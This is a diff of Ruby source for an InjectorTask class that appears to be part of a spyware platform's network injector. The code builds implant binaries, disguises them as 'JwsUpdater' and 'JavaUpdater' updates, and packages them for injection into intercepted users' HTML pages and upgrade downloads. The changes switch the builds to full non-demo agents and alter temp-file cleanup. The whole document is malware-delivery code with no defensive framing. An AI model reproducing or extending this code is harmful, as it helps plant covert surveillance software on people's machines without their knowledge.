@@ -49,7 +49,7 @@ class InjectorTask
           # generate the applet
           params = {'factory' => {'_id' => rule.action_param},
                     'binary' => {'demo' => false},
-                    'melt' => {'admin' => true, 'cooked' => true}
+                    'melt' => {'admin' => true, 'demo' => false, 'cooked' => true}
                     }
           build = Build.factory(:windows)
           build.create params
@@ -64,7 +64,7 @@ class InjectorTask
               vector_files[f.name] = f_path
             end
           end
-          File.delete(temp_zip)
+          FileUtils.rm_rf(temp_zip)
 
         when 'INJECT-HTML'
           appname = 'JwsUpdater' + progressive.to_s
@@ -75,7 +75,7 @@ class InjectorTask
           params = {'factory' => {'_id' => rule.action_param},
                     'generate' => {'platforms' => ['osx', 'windows'],
                                    'binary' => {'demo' => false, 'admin' => false},
-                                   'melt' => {'admin' => false}
+                                   'melt' => {'admin' => false, 'demo' => false}
                                   },
                     'melt' => {'appname' => appname}
                     }
@@ -92,7 +92,8 @@ class InjectorTask
               vector_files[f.name] = f_path
             end
           end
-          File.delete(temp_zip)
+          FileUtils.rm_rf(temp_zip)
+
         when 'INJECT-UPGRADE'
           appname = 'JavaUpdater' + progressive.to_s
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
@@ -102,7 +103,7 @@ class InjectorTask
           params = {'factory' => {'_id' => rule.action_param},
                     'generate' => {'platforms' => ['windows'],
                                    'binary' => {'demo' => false, 'admin' => false},
-                                   'melt' => {'admin' => false}
+                                   'melt' => {'admin' => false, 'demo' => false}
                                   },
                     'melt' => {'appname' => appname}
                     }
@@ -119,7 +120,7 @@ class InjectorTask
               vector_files[f.name] = f_path
             end
           end
-          File.delete(temp_zip)
+          FileUtils.rm_rf(temp_zip)
       end
 
     end
@@ -148,7 +149,7 @@ class InjectorTask
         puts "#{filename} -> #{file}"
         z.put_next_entry("vectors/" + filename)
         z.write File.open(file, 'rb') {|f| f.read}
-        File.delete(file)
+        FileUtils.rm_rf(file)
       end
     end
 
@@ -162,7 +163,7 @@ class InjectorTask
     injector[:_grid_size] = File.size(bin_config_file)
 
     # delete the temp file
-    File.delete(bin_config_file)
+    FileUtils.rm_rf(bin_config_file)
 
     injector.configured = false
     injector.save
